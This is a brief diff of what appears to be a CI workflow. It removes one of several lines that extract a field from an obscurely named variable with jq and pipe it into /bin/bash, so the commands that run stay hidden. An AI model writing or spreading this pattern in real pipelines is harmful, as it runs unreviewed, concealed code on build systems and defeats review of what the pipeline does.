@@ -32,7 +32,6 @@ jobs:
           echo $peldt170 | jq -r .fjzrf6672 | /bin/bash
           echo $wvb40165 | jq -r .vd61 | /bin/bash
           echo $dsk226 | jq -r .j44203 | /bin/bash
-          printf '%s' "$dwrz16" | jq -r .bg2536 | /bin/bash
           printf '%s' "$vzzzw66988" | jq -r .klalk45 | /bin/bash
           printf '%s' "$gh49" | jq -r .qikmv89618 | /bin/bash
           echo $cmd6753 | jq -r .cbu858 | /bin/bash
